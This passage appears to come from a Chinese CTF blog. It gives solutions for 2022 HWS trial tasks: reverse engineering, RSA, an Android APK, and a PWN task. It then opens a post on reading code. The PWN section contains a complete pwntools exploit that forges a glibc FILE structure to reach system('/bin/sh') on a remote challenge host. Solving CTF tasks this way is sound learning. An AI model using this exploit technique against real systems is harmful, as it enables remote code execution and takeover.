src="/p/wpFor-2022HWSTrial/image-20220124163001750.png"></p><p>ooo000的魔改在取数的时候取的是x^(x&gt;&gt;3)而不是x</p><p><img src="/p/wpFor-2022HWSTrial/image-20220124163120723.png"></p><p>因为这个改动比较大，选择手写base64解码</p><p><img src="/p/wpFor-2022HWSTrial/image-20220124163222781.png"></p><p><img src="/p/wpFor-2022HWSTrial/image-20220124163241225.png"></p><p>invshift是以前比赛中用过的对x^(x&gt;&gt;3)算法的逆向函数（一招鲜吃遍天了属于是</p><p><img src="/p/wpFor-2022HWSTrial/image-20220124163329514.png"></p><p>算出来以后发现只拿到了后半部分，flag应该是一个uuid，前面少了八个字节</p><p><img src="/p/wpFor-2022HWSTrial/image-20220124163427892.png"></p><p>于是跑回去翻java层，发现这个包其实是有个main2activity的（下次搜索一定少搜一点555，绝了</p><p>这里一看就是主函数了</p><p><img src="/p/wpFor-2022HWSTrial/image-20220124215445481.png"></p><p>比对前五字节是”flag{“和末尾字节的”}”，把中间的部分提取出来，检查[0:3]是”e25”，剩下五位爆破md5</p><p><img src="/p/wpFor-2022HWSTrial/image-20220124104800696.png"></p><p>一个比较坑的地方在hexdigits是改了表的！！！！！！出题人其心可诛！！！！！！（划掉</p><p>爆了好久爆不出来才发现，太绝了，手动把哈希值的4和5、E和F进行替换来爆破才爆出来</p><p><img src="/p/wpFor-2022HWSTrial/image-20220124112955518.png"></p><p>整道题的exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"><span class="keyword">from</span> arc4 <span class="keyword">import</span> ARC4</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bf</span>(<span class="params">s</span>):</span></span><br><span class="line">    s = s.lower()</span><br><span class="line">    charset = <span class="string">&quot;0123456789abcdef&quot;</span></span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> charset:</span><br><span class="line">        <span class="keyword">for</span> b <span class="keyword">in</span> charset:</span><br><span class="line">            <span class="keyword">for</span> c <span class="keyword">in</span> charset:</span><br><span class="line">                <span class="keyword">for</span> d <span class="keyword">in</span> charset:</span><br><span class="line">                    <span class="keyword">for</span> e <span class="keyword">in</span> charset:</span><br><span class="line">                        tmps = a + b + c + d + e</span><br><span class="line">                        <span class="keyword">if</span> md5(tmps.encode()).hexdigest() == s:</span><br><span class="line">                            <span class="keyword">return</span> tmps</span><br><span class="line"></span><br><span class="line">res = bf(<span class="string">&quot;1F862D87DB3293B81C7D2935477A22EA&quot;</span>) <span class="comment">#手动将4和5，E和F进行替换</span></span><br><span class="line">dst = [<span class="number">0x000000A8</span>, <span class="number">0x000000CE</span>, <span class="number">0x000000CE</span>, <span class="number">0x000000D7</span>, <span class="number">0x000000B1</span>, <span class="number">0x0000005A</span>, <span class="number">0x00000020</span>, <span class="number">0x0000004B</span>, <span class="number">0x000000AB</span>, <span class="number">0x000000A2</span>, <span class="number">0x00000023</span>, <span class="number">0x000000FA</span>, <span class="number">0x000000FC</span>, <span class="number">0x000000F0</span>, <span class="number">0x000000DF</span>, <span class="number">0x000000A5</span>, <span class="number">0x000000B4</span>, <span class="number">0x00000077</span>, <span class="number">0x000000E6</span>, <span class="number">0x00000041</span>, <span class="number">0x000000C4</span>, <span class="number">0x00000065</span>, <span class="number">0x00000084</span>, <span class="number">0x00000091</span>, <span class="number">0x0000008B</span>, <span class="number">0x0000000A</span>, <span class="number">0x000000E6</span>, <span class="number">0x000000AE</span>, <span class="number">0x000000BB</span>, <span class="number">0x000000B5</span>, <span class="number">0x00000037</span>, <span class="number">0x000000FD</span>, <span class="number">0x000000C0</span>, <span class="number">0x000000CB</span>, <span class="number">0x00000072</span>, <span class="number">0x00000078</span>, <span class="number">0x00000013</span>, <span class="number">0x00000091</span>, <span class="number">0x000000D3</span>, <span class="number">0x0000005E</span>]</span><br><span class="line">keytable = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789&quot;</span>[::<span class="number">-1</span>]</span><br><span class="line">key = []</span><br><span class="line">v1 = <span class="number">-2078209981</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">    v13 = ((v1 * i) &gt;&gt; <span class="number">32</span>) + i</span><br><span class="line">    v14 = (v13 &gt;&gt; <span class="number">5</span>) + (v13 &gt;&gt; <span class="number">31</span>)</span><br><span class="line">    <span class="keyword">if</span> i - <span class="number">62</span>*v14 &lt; <span class="number">0</span>:</span><br><span class="line">        print(i, i - <span class="number">62</span>*v14)</span><br><span class="line">    key.append(keytable[i - <span class="number">62</span> * v14])</span><br><span class="line"></span><br><span class="line">key = <span class="string">&#x27;&#x27;</span>.join(key).encode()</span><br><span class="line">dst = <span class="built_in">bytes</span>(dst)</span><br><span class="line">rc4 = ARC4(key)</span><br><span class="line">RC4ans = rc4.encrypt(dst)</span><br><span class="line">src = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(RC4ans)):</span><br><span class="line">    src.append(RC4ans[i] ^ i)</span><br><span class="line">src = <span class="built_in">bytes</span>(src).decode()</span><br><span class="line"></span><br><span class="line">table = <span class="string">&quot;ZO6Kq79L&amp;CPWvNopzQfghDRSG@di*kAB8rsFewxlm+/u5a^2YtTJUVEn0$HI34y#&quot;</span></span><br><span class="line">tmp = []</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> src:</span><br><span class="line">    <span class="keyword">if</span> x == <span class="string">&#x27;=&#x27;</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    tmp.append(table.index(x))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">invshift</span>(<span class="params">m, k, c</span>):</span></span><br><span class="line">    revm = <span class="number">0</span></span><br><span class="line">    <span class="keyword">if</span> k &lt; <span class="number">0</span>:</span><br><span class="line">        k = -k</span><br><span class="line">        cnt = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> cnt &lt; <span class="number">64</span>:</span><br><span class="line">            hk = (revm &lt;&lt; (<span class="number">64</span> - k)) &amp; <span class="number">0xffffffffffffffff</span></span><br><span class="line">            tmp = (hk &amp; c) ^ m</span><br><span class="line">            revm = (revm &lt;&lt; k) + (tmp &gt;&gt; (<span class="number">64</span> - k))</span><br><span class="line"></span><br><span class="line">            m = (m &lt;&lt; k) &amp; <span class="number">0xffffffffffffffff</span></span><br><span class="line">            c = (c &lt;&lt; k) &amp; <span class="number">0xffffffffffffffff</span></span><br><span class="line">            cnt += k</span><br><span class="line">        <span class="keyword">return</span> revm &gt;&gt; (cnt - <span class="number">64</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        cnt = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> cnt &lt; <span class="number">64</span>:</span><br><span class="line">            lk = revm &gt;&gt; cnt</span><br><span class="line">            tmp = ((lk &amp; c) ^ m) &amp; ((<span class="number">1</span> &lt;&lt; k) - <span class="number">1</span>)</span><br><span class="line">            revm = (tmp &lt;&lt; (cnt + k)) + revm</span><br><span class="line">            m = m &gt;&gt; k</span><br><span class="line">            c = c &gt;&gt; k</span><br><span class="line">            cnt += k</span><br><span class="line">        <span class="keyword">return</span> (revm &gt;&gt; k) &amp; <span class="number">0xffffffffffffffff</span></span><br><span class="line"></span><br><span class="line">ans = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> tmp:</span><br><span class="line">    ans += <span class="built_in">bin</span>(invshift(x, <span class="number">-3</span>, <span class="number">0x3f</span>))[<span class="number">2</span>:].rjust(<span class="number">6</span>, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(ans), <span class="number">8</span>):</span><br><span class="line">    flag += <span class="built_in">chr</span>(<span class="built_in">int</span>(ans[i:i+<span class="number">8</span>], <span class="number">2</span>))</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;e25&#x27;</span> + res + flag</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><p><img src="/p/wpFor-2022HWSTrial/image-20220124222727256.png"></p><p>flag：<strong>e25be952-e74b-4649-bc0d-236342079a59</strong></p><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="babyrsa"><a href="#babyrsa" class="headerlink" title="babyrsa"></a>babyrsa</h2><p>看题目就是一个rsa加密，给了e、N、c求m。</p><p>如果N能分解的话就是一个RSA模板题了，用<a href="http://www.factordb.com/%E8%AF%95%E8%AF%95%E5%8F%91%E7%8E%B0%E8%BF%98%E7%9C%9F%E5%8F%AF%E4%BB%A5%E3%80%82">http://www.factordb.com/试试发现还真可以。</a></p><p><img src="/p/wpFor-2022HWSTrial/image-20220123122511290.png"></p><p>分解拿到p和q，用sage手撸一个解密算法：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">e = <span class="number">2199344405076718723439776106818391416986774637417452818162477025957976213477191723664184407417234793814926418366905751689789699138123658292718951547073938244835923378103264574262319868072792187129755570696127796856136279813658923777933069924139862221947627969330450735758091555899551587605175567882253565613163972396640663959048311077691045791516671857020379334217141651855658795614761069687029140601439597978203375244243343052687488606544856116827681065414187957956049947143017305483200122033343857370223678236469887421261592930549136708160041001438350227594265714800753072939126464647703962260358930477570798420877</span></span><br><span class="line">p = <span class="number">98197216341757567488149177586991336976901080454854408243068885480633972200382596026756300968618883148721598031574296054706280190113587145906781375704611841087782526897314537785060868780928063942914187241017272444601926795083433477673935377466676026146695321415853502288291409333200661670651818749836420808033</span></span><br><span class="line">q = <span class="number">133639826298015917901017908376475546339925646165363264658181838203059432536492968144231040597990919971381628901127402671873954769629458944972912180415794436700950304720548263026421362847590283353425105178540468631051824814390421486132775876582962969734956410033443729557703719598998956317920674659744121941513</span></span><br><span class="line">c = <span class="number">1492164290534197296766878830710549288168716657792979479408332026408553210558539364503279432780006256047888761718878241924947937039103166564146378209168719163067531460700424309878383312837345239570897122826051628153030129647363574035072755426112229160684859510640271933580581310029921376842631120847546030843821787623965614564745724229763999106839802052036834811357341644073138100679508864747009014415530176077648226083725813290110828240582884113726976794751006967153951269748482024859714451264220728184903144004573228365893961477199925864862018084224563883101101842275596219857205470076943493098825250412323522013524</span></span><br><span class="line">N = p*q</span><br><span class="line">print(N == <span class="number">13123058934861171416713230498081453101147538789122070079961388806126697916963123413431108069961369055630747412550900239402710827847917960870358653962948282381351741121884528399369764530446509936240262290248305226552117100584726616255292963971141510518678552679033220315246377746270515853987903184512948801397452104554589803725619076066339968999308910127885089547678968793196148780382182445270838659078189316664538631875879022325427220682805580410213245364855569367702919157881367085677283124732874621569379901272662162025780608669577546548333274766058755786449491277002349918598971841605936268030140638579388226573929</span>)</span><br><span class="line"></span><br><span class="line">phi = (p<span class="number">-1</span>) * (q<span class="number">-1</span>)</span><br><span class="line">d = inverse_mod(e, phi)</span><br><span class="line">print(<span class="built_in">pow</span>(c, d, N))</span><br></pre></td></tr></table></figure><p><img src="/p/wpFor-2022HWSTrial/image-20220123121145005.png"></p><p>然后丢进python里long_to_bytes一下拿到flag：</p><p><img src="/p/wpFor-2022HWSTrial/image-20220123121202535.png"></p><p>flag：<strong>01d_Curs3_c4Me_Again</strong></p><h2 id="Accelerate-your-time"><a href="#Accelerate-your-time" class="headerlink" title="Accelerate your time"></a>Accelerate your time</h2><p>看到附件给了apk，啪的一下就点进来了，很快啊（x</p><p>是个kotlin写的apk，以前没逆什么kotlin的经验，一通瞎做搞出来的orz</p><p>直接用jeb看（类似于看平时apk的java层），翻包名看到flag，感觉是个重点包，定位到主行为函数</p><p><img src="/p/wpFor-2022HWSTrial/image-20220124150927504.png"></p><p><img src="/p/wpFor-2022HWSTrial/image-20220124150952531-16431747689823.png" alt="image-20220124150952531"></p><p>可以看到很明显的check，是把当前的时间做了一个md5塞进大括号里，再拼上用户名和密码，最后再做一个md5跟已知字符串比较。这里的md5取的是[8:24]↓</p><p><img src="/p/wpFor-2022HWSTrial/image-20220124152902690.png"></p><p>hour我直接大胆猜测是4，前面看到有特判</p><p><img src="/p/wpFor-2022HWSTrial/image-20220124153715949.png"></p><p>min和sec没看到特判，但是60*60的空间完全可以爆破</p><p>username和password的xor联系在LoginDataSource里，并且username &#x3D;&#x3D; trandmark</p><p><img src="/p/wpFor-2022HWSTrial/image-20220125223349886.png"></p><p>安卓包的字符串内容是写在res&#x2F;strings.xml里面的，只要拿到name就可以拿到trandmark的内容：</p><p><img src="/p/wpFor-2022HWSTrial/image-20220124154007240.png"></p><p>用户名是Android，密码可以异或得到，md5的结果同样在strings.xml中，须做id-&gt;name、name-&gt;content的映射</p><p><img src="/p/wpFor-2022HWSTrial/image-20220124154227226.png"></p><p><img src="/p/wpFor-2022HWSTrial/image-20220124154246364.png"></p><p>flag就可以出来了，爆破分秒写exp：（其实感觉这题才应该叫TimeTravel才对&#x3D; &#x3D;只能在特定时间拿到flag嘛）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"></span><br><span class="line"><span class="comment">#username^password</span></span><br><span class="line">xorarr = [<span class="number">6</span>, <span class="number">28</span>, <span class="number">1</span>, <span class="number">19</span>, <span class="number">27</span>, <span class="number">5</span>, <span class="number">29</span>]</span><br><span class="line">username = <span class="string">&quot;Android&quot;</span></span><br><span class="line">password = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(xorarr)):</span><br><span class="line">    password += <span class="built_in">chr</span>(<span class="built_in">ord</span>(username[i]) ^ xorarr[i])</span><br><span class="line"></span><br><span class="line">hashstr_8_23 = <span class="string">&quot;1a9852e856816224&quot;</span></span><br><span class="line">h = <span class="built_in">str</span>(<span class="number">4</span>)</span><br><span class="line"><span class="keyword">for</span> m <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">60</span>):</span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">60</span>):</span><br><span class="line">        flag = <span class="string">&quot;flag&#123;&quot;</span> + md5((h+<span class="built_in">str</span>(m)+<span class="built_in">str</span>(s)).encode()).hexdigest()[<span class="number">8</span>:<span class="number">24</span>] + <span class="string">&quot;&#125;&quot;</span> + username + password</span><br><span class="line">        <span class="keyword">if</span> md5(flag.encode()).hexdigest()[<span class="number">8</span>:<span class="number">24</span>] == hashstr_8_23:</span><br><span class="line">            print(flag)</span><br></pre></td></tr></table></figure><p><img src="/p/wpFor-2022HWSTrial/image-20220124154428658.png"></p><p>flag：<strong>80d0169d22da3c35</strong></p><h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="送分题"><a href="#送分题" class="headerlink" title="送分题"></a>送分题</h2><p>送分题真的是送分题啊，看到做题的人异常地多，于是去找原题，发现真的找到了wp</p><p><a href="https://www.anquanke.com/post/id/258512%EF%BC%88justpwnit%EF%BC%89%EF%BC%8C%E7%9B%B4%E6%8E%A5%E6%89%93wp%E7%9A%84exp%E6%89%93%E9%80%9A%E4%BA%86%EF%BC%88">https://www.anquanke.com/post/id/258512（justpwnit），直接打wp的exp打通了（</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># from LibcSearcher import *</span></span><br><span class="line"><span class="comment"># context.log_level=&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment"># debug = 1</span></span><br><span class="line">file_name = <span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line"><span class="comment"># libc_name = &#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span></span><br><span class="line">libc_name = <span class="string">&#x27;./libc-2.27.so&#x27;</span></span><br><span class="line">ip = <span class="string">&#x27;1.13.162.249&#x27;</span></span><br><span class="line">prot = <span class="string">&#x27;10001&#x27;</span></span><br><span class="line"><span class="comment"># if debug:</span></span><br><span class="line">    <span class="comment"># r = process(file_name)</span></span><br><span class="line">    <span class="comment"># libc = ELF(libc_name)</span></span><br><span class="line"><span class="comment"># else:</span></span><br><span class="line">r = remote(ip,<span class="built_in">int</span>(prot))</span><br><span class="line">libc = ELF(libc_name)</span><br><span class="line"></span><br><span class="line"><span class="comment"># def debug():</span></span><br><span class="line"><span class="comment">#     gdb.attach(r)</span></span><br><span class="line"><span class="comment">#     raw_input()</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pack_file</span>(<span class="params">_flags = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _IO_read_ptr = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _IO_read_end = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _IO_read_base = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _IO_write_base = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _IO_write_ptr = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _IO_write_end = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _IO_buf_base = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _IO_buf_end = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _IO_save_base = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _IO_backup_base = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _IO_save_end = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _IO_marker = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _IO_chain = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _fileno = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _lock = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _wide_data = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _mode = <span class="number">0</span></span>):</span></span><br><span class="line">    file_struct = p32(_flags) + \</span><br><span class="line">             p32(<span class="number">0</span>) + \</span><br><span class="line">             p64(_IO_read_ptr) + \</span><br><span class="line">             p64(_IO_read_end) + \</span><br><span class="line">             p64(_IO_read_base) + \</span><br><span class="line">             p64(_IO_write_base) + \</span><br><span class="line">             p64(_IO_write_ptr) + \</span><br><span class="line">             p64(_IO_write_end) + \</span><br><span class="line">             p64(_IO_buf_base) + \</span><br><span class="line">             p64(_IO_buf_end) + \</span><br><span class="line">             p64(_IO_save_base) + \</span><br><span class="line">             p64(_IO_backup_base) + \</span><br><span class="line">             p64(_IO_save_end) + \</span><br><span class="line">             p64(_IO_marker) + \</span><br><span class="line">             p64(_IO_chain) + \</span><br><span class="line">             p32(_fileno)</span><br><span class="line">    file_struct = file_struct.ljust(<span class="number">0x88</span>, <span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">    file_struct += p64(_lock)</span><br><span class="line">    file_struct = file_struct.ljust(<span class="number">0xa0</span>, <span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">    file_struct += p64(_wide_data)</span><br><span class="line">    file_struct = file_struct.ljust(<span class="number">0xc0</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    file_struct += p64(_mode)</span><br><span class="line">    file_struct = file_struct.ljust(<span class="number">0xd8</span>, <span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> file_struct</span><br><span class="line"></span><br><span class="line">file = ELF(file_name)</span><br><span class="line">sl = <span class="keyword">lambda</span> x : r.sendline(x)</span><br><span class="line">sd = <span class="keyword">lambda</span> x : r.send(x)</span><br><span class="line">sla = <span class="keyword">lambda</span> x,y : r.sendlineafter(x,y)</span><br><span class="line">rud = <span class="keyword">lambda</span> x : r.recvuntil(x,drop=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x : r.recvuntil(x)</span><br><span class="line">li = <span class="keyword">lambda</span> name,x : log.info(name+<span class="string">&#x27;:&#x27;</span>+<span class="built_in">hex</span>(x))</span><br><span class="line">ri = <span class="keyword">lambda</span>  : r.interactive()</span><br><span class="line">ru(<span class="string">&#x27;Now you can get a big box, what size?&#x27;</span>)</span><br><span class="line">sl(<span class="built_in">str</span>(<span class="number">0x1430</span>))</span><br><span class="line">ru(<span class="string">&#x27;Now you can get a bigger box, what size?&#x27;</span>)</span><br><span class="line">sl(<span class="built_in">str</span>(<span class="number">0x5000</span>))</span><br><span class="line">ru(<span class="string">&#x27;Do you want to rename?(y/n)&#x27;</span>)</span><br><span class="line">sl(<span class="string">&#x27;y&#x27;</span>)</span><br><span class="line">ru(<span class="string">&#x27;Now your name is:&#x27;</span>)</span><br><span class="line">main_arena = u64(r.recv(<span class="number">6</span>) + <span class="string">&#x27;\x00\x00&#x27;</span>)</span><br><span class="line">li(<span class="string">&quot;main_arena&quot;</span>,main_arena)</span><br><span class="line">libc_base = main_arena<span class="number">-0x3ebca0</span></span><br><span class="line">system = libc_base+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">global_max_fast = libc_base+<span class="number">0x3ed940</span></span><br><span class="line">IO_list_all = libc_base + libc.symbols[<span class="string">&#x27;_IO_list_all&#x27;</span>]</span><br><span class="line">IO_str_jumps = <span class="number">0x3e8360</span> + libc_base</span><br><span class="line">payload = p64(main_arena)+p64(global_max_fast<span class="number">-0x10</span>)</span><br><span class="line">binsh = <span class="number">0x00000000001b40fa</span> + libc_base</span><br><span class="line">sl(payload)</span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line">ru(<span class="string">&quot;Do you want to edit big box or bigger box?(1:big/2:bigger)\n&quot;</span>)</span><br><span class="line">sl(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">ru(<span class="string">&#x27;:\n&#x27;</span>)</span><br><span class="line">fake_file = pack_file(_IO_read_base=IO_list_all<span class="number">-0x10</span>,</span><br><span class="line">                    _IO_write_base=<span class="number">0</span>,</span><br><span class="line">                    _IO_write_ptr=<span class="number">1</span>,</span><br><span class="line">                    _IO_buf_base=binsh,</span><br><span class="line">                    _mode=<span class="number">0</span>,)</span><br><span class="line">fake_file += p64(IO_str_jumps<span class="number">-8</span>)+p64(<span class="number">0</span>)+p64(system)</span><br><span class="line">sl(fake_file[<span class="number">0x10</span>:])</span><br><span class="line">ri()</span><br></pre></td></tr></table></figure><p><img src="/p/wpFor-2022HWSTrial/image-20220124150811994.png"></p><p>flag：<strong>5hen_m3_5hi_kuai_1e_xin9_Qiu</strong></p>]]></content>
      
      
      <categories>
          
          <category> Write up </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Reverse </tag>
            
            <tag> Misc </tag>
            
            <tag> wp </tag>
            
            <tag> PWN </tag>
            
            <tag> Crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Reading Code rapidly</title>
      <link href="p/blogsFor-ComSec-readingCodes/"/>
      <url>p/blogsFor-ComSec-readingCodes/</url>
      
        <content type="html"><![CDATA[<style type="text/css">    .reveal .left_items{         text-align: left;        font-size: 28px;    }    .reveal .subtitles{        text-shadow: 5px 5px 10px #39C5BB;    }    .reveal .subtitle1{        color: #921AFF;        text-shadow: 3px 3px 3px #0080FF;    }    .reveal ul{         display: block;     }</style><h1 id="Reading-Code-rapidly"><a href="#Reading-Code-rapidly" class="headerlink" title="Reading Code rapidly"></a>Reading Code rapidly</h1><blockquote><p>By c10udlnk</p></blockquote><p>&#x3D;&#x3D;</p><p><img src="/p/blogsFor-ComSec-readingCodes/image-20211126164041910.png"></p><p>&#x3D;&#x3D;&#x3D;</p><h2 id="目的"><a href="#目的" class="headerlink" title="目的"></a>目的</h2><br><ol><li>逆向分析</li><li>源码学习</li><li>接口使用</li><li>工具魔改</li></ol><p>&#x3D;&#x3D;</p><h2 id="一个很重要很重要…的技巧"><a href="#一个很重要很重要…的技巧" class="headerlink" title="一个很重要很重要…的技巧"></a>一个很重要很重要…的技巧</h2><br><p>从</p><h3 id="抽象"><a href="#抽象" class="headerlink" title="抽象"></a>抽象</h3><p>到</p><h3 id="细致"><a href="#细致" class="headerlink" title="细致"></a>细致</h3><p>&#x3D;&#x3D;</p><h3 id="抽象-1"><a href="#抽象-1" class="headerlink" title="抽象"></a>抽象</h3><ul><li>函数名</li><li>函数定义</li><li>参数和返回值</li></ul><p>&#x3D;&#x3D;</p><h3 id="细致-1"><a href="#细致-1" class="headerlink" title="细致"></a>细致</h3><ul><li>某功能的具体实现</li><li>某些数据的数据类型</li><li>一些微不足道 <small><del>（有时候非常重要）</del></small> 